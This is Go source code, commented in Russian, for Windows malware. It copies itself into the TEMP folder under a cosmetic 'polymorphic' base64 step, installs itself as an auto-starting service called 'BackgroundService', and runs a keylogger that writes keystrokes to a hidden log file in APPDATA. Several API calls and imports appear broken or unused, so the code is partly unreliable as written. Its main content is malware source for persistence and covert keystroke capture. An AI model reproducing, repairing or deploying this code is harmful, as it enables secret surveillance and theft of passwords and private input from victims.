package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/shirou/gopsutil/process"
	"golang.org/x/sys/windows"
)

// Полиморфная функция для изменения кода программы
func polymorphicTransform(code []byte) []byte {
	// Простой пример полиморфизма: шифрование Base64
	encoded := base64.StdEncoding.EncodeToString(code)
	return []byte(encoded)
}

// Функция для создания копии программы
func selfCopy() {
	exePath, err := os.Executable()
	if err != nil {
		log.Println("Ошибка получения пути исполняемого файла:", err)
		return
	}

	newExePath := filepath.Join(os.Getenv("TEMP"), "service.exe")
	data, err := ioutil.ReadFile(exePath)
	if err != nil {
		log.Println("Ошибка чтения исполняемого файла:", err)
		return
	}

	// Применяем полиморфное преобразование
	transformedData := polymorphicTransform(data)

	// Декодируем обратно перед записью
	decodedData, err := base64.StdEncoding.DecodeString(string(transformedData))
	if err != nil {
		log.Println("Ошибка декодирования:", err)
		return
	}

	err = ioutil.WriteFile(newExePath, decodedData, 0755)
	if err != nil {
		log.Println("Ошибка записи нового файла:", err)
		return
	}

	// Запускаем новый экземпляр
	cmd := exec.Command(newExePath)
	cmd.Start()
}

// Функция для установки программы как службы
func installService() {
	serviceName := "BackgroundService"
	servicePath, _ := os.Executable()

	// Создаем службу
	scm := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CREATE_SERVICE)
	defer windows.CloseServiceHandle(scm)

	service, err := windows.CreateService(scm, windows.StringToUTF16Ptr(serviceName),
		windows.StringToUTF16Ptr(serviceName), windows.SERVICE_ALL_ACCESS,
		windows.SERVICE_WIN32_OWN_PROCESS, windows.SERVICE_AUTO_START,
		windows.SERVICE_ERROR_NORMAL, windows.StringToUTF16Ptr(servicePath),
		nil, nil, nil, nil)
	if err != nil {
		log.Println("Ошибка создания службы:", err)
		return
	}
	defer windows.CloseServiceHandle(service)

	// Запускаем службу
	err = windows.StartService(service, 0, nil)
	if err != nil {
		log.Println("Ошибка запуска службы:", err)
	}
}

// Функция для записи нажатий клавиш
func keylogger() {
	filePath := filepath.Join(os.Getenv("APPDATA"), "hidden.log")
	file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		log.Println("Ошибка открытия файла:", err)
		return
	}
	defer file.Close()

	// Устанавливаем атрибут "скрытый" для файла
	attr := windows.FileAttributeHidden
	err = windows.SetFileAttributes(syscall.StringToUTF16Ptr(filePath), attr)
	if err != nil {
		log.Println("Ошибка установки атрибута 'скрытый':", err)
	}

	// Цикл для отслеживания нажатий клавиш
	for {
		buffer := make([]uint8, 256)
		user32 := windows.NewLazySystemDLL("user32.dll")
		getAsyncKeyState := user32.NewProc("GetAsyncKeyState")

		for i := uint8(0); i < 256; i++ {
			ret, _, _ := getAsyncKeyState.Call(uintptr(i))
			if ret != 0 {
				key := fmt.Sprintf("%c", i)
				file.WriteString(key)
			}
		}
		time.Sleep(10 * time.Millisecond)
	}
}

// Основная функция
func main() {
	runtime.LockOSThread()

	// Проверяем, запущена ли уже другая копия
	processes, _ := process.Processes()
	for _, p := range processes {
		if strings.Contains(p.Name(), "service.exe") && p.Pid != os.Getpid() {
			log.Println("Другая копия уже запущена.")
			os.Exit(0)
		}
	}

	// Самокопирование
	selfCopy()

	// Установка службы
	installService()

	// Запуск keylogger
	keylogger()
}
